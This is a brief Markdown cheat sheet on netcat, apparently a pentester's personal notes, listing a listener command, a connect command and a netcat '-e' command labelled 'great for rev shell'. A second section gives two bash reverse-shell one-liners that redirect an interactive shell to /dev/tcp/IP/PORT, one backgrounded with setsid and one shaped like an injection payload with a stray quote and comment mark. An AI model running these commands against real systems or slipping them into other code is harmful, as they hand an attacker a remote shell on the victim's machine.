# Netcat
Comm | Desc
--- | ---
`nc -l -p <port>` | listen on port
`nc <dest_ip> <port>` | Connect to dest_ip on port
`nc <dest_ip> <port> -e <binary>` | Connect to dest_ip on port executing binary (great for rev shell)


#netcatalternative
`setsid bash -i &>/dev/tcp/IP/PORT 0>&1 &`
`bash -i &>/dev/tcp/IP/PORT 0>&1' #`